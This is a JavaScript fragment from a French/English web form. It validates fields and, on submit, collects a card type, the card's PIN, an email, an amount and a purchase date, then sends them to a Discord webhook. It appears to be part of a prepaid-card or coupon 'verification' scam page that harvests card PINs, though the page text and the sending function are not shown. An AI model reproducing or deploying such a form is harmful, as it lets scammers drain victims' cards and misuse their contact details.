    elements.purchaseDateInput.addEventListener('input', () => {
        markFormDirty();
        debounce('date', () => validateDate(false), 150);
    });
    elements.purchaseDateInput.addEventListener('blur', () => validateDate(true));

    elements.messageInput.addEventListener('input', markFormDirty);

    // Soumission du formulaire
    elements.form.addEventListener('submit', async event => {
        event.preventDefault();
        clearInlineResult();

        if (!validateForm()) {
            return;
        }

        elements.submitBtn.disabled = true;
        elements.btnText.classList.add('hidden');
        elements.btnLoader.classList.remove('hidden');

        const formData = {
            cardType: elements.cardTypeInput.value,
            pin: sanitizePin(elements.pinInput.value),
            email: elements.emailInput.value.trim(),
            amount: elements.amountInput.value || 'Non spécifié',
            purchaseDate: elements.purchaseDateInput.value || 'Non spécifié',
            message: elements.messageInput.value.trim() || 'Aucun message',
            timestamp: new Date().toLocaleString(currentLang === 'fr' ? 'fr-FR' : 'en-US'),
            lang: currentLang
        };

        try {
            const success = await sendToDiscord(formData);

            if (!success) {
                throw new Error('Webhook request failed');
            }

            resetFormState();
            openSuccessModal();
        } catch (error) {
            console.error('Form submission failed:', error);
            showInlineError(error.message || getCurrentTranslations().result.error);
        } finally {
            elements.submitBtn.disabled = false;
            elements.btnText.classList.remove('hidden');
            elements.btnLoader.classList.add('hidden');
        }
    });

    document.addEventListener('keydown', handleGlobalKeydown);

    prefersReducedMotion.addEventListener('change', () => {
        if (prefersReducedMotion.matches) {
            elements.confettiLayer.innerHTML = '';
        }
    });
}

// ===== INITIALISATION =====
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}